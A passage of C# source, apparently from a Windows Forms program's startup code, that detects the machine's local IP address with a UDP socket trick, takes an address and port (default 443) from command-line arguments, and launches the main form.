            // NEW: Auto-detect IP if it's 0.0.0.0
            if (ipAddress == "0.0.0.0")
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                    {
                        socket.Connect("8.8.8.8", 65530);
                        IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                        ipAddress = endPoint.Address.ToString();
                    }
                }
                catch
                {
                    ipAddress = "127.0.0.1"; // Fallback
                }
            }
            int port = 443;

            if (args.Length >= 2)
            {
                ipAddress = args[0];
                if (!int.TryParse(args[1], out port))
                {
                    port = 443;
                }
            }

            // Create and run the main form
            MainForm mainForm = new MainForm();
            Application.Run(mainForm);
        }
    }



}